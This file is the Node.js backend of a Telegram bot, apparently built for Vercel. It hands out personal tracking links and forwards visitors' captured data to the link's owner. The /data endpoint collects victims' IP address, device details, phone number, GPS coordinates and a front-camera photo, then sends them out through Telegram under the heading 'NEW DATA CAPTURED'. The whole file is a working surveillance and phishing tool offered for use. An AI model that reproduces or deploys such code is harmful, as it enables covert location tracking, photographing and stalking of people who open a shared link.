const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

const app = express();
app.use(express.json());

// Vercel environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBSITE_URL = process.env.WEBSITE_URL || 'https://your-app.vercel.app';

const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // Polling off for serverless

// Store user data in memory (Vercel pe temporary)
const userStats = new Map();

// Webhook setup for Telegram
app.post('/webhook', async (req, res) => {
  try {
    const update = req.body;
    
    // Handle /start command
    if (update.message && update.message.text === '/start') {
      const chatId = update.message.chat.id;
      const userId = update.message.from.id;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "📢 Join Channel 1", url: "https://t.me/your_channel1" },
            { text: "📢 Join Channel 2", url: "https://t.me/your_channel2" }
          ],
          [
            { text: "✅ I Have Joined", callback_data: "verify_join" }
          ]
        ]
      };
      
      await bot.sendMessage(chatId, 
        `🎉 *Welcome to Free Data Bot!*\n\n` +
        `*Get Complete Data When Anyone Visits Your Link!*\n\n` +
        `🔧 *Powered by Happy Bot*`,
        { parse_mode: 'Markdown', reply_markup: keyboard }
      );
    }
    
    // Handle callback queries
    if (update.callback_query) {
      const query = update.callback_query;
      const chatId = query.message.chat.id;
      const userId = query.from.id;
      
      if (query.data === 'verify_join') {
        const personalLink = `${WEBSITE_URL}?id=${userId}`;
        
        const keyboard = {
          inline_keyboard: [
            [{ text: "🔗 Copy Link", callback_data: "copy_link" }],
            [{ text: "🔄 New Link", callback_data: "new_link" }]
          ]
        };
        
        await bot.sendMessage(chatId,
          `✅ *Verification Complete!*\n\n` +
          `🎯 *Your Personal Link:*\n` +
          `\`${personalLink}\`\n\n` +
          `📨 Send this link to get complete data!\n\n` +
          `🔧 *Developed by Happy Bot* 🚀`,
          { parse_mode: 'Markdown', reply_markup: keyboard }
        );
      }
      
      await bot.answerCallbackQuery(query.id);
    }
    
    res.status(200).send('OK');
  } catch (error) {
    console.error('Webhook error:', error);
    res.status(500).send('Error');
  }
});

// Data receive endpoint
app.post('/data', async (req, res) => {
  try {
    const { userId, data, photo, mapImage } = req.body;
    
    const message = `🔐 <b>NEW DATA CAPTURED</b>\n\n` +
                   `🌐 <b>IP:</b> ${data.ip || 'N/A'}\n` +
                   `📱 <b>Device:</b> ${data.device?.userAgent || 'N/A'}\n` +
                   `📞 <b>Phone:</b> ${data.form?.phone || 'N/A'}\n` +
                   `📍 <b>Location:</b> ${data.location ? `${data.location.lat}, ${data.location.lng}` : 'N/A'}\n` +
                   `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
                   `🔧 <b>Developed by Happy Bot</b> 🚀`;
    
    // Send to user
    await bot.sendMessage(userId, message, { parse_mode: 'HTML' });
    
    if (photo) {
      await bot.sendPhoto(userId, photo, {
        caption: '📸 Front Camera Photo - Happy Bot'
      });
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Data receive error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check
app.get('/', (req, res) => {
  res.json({ 
    status: '🚀 Happy Bot Running', 
    developedBy: 'Happy Bot',
    timestamp: new Date().toISOString()
  });
});

module.exports = app;
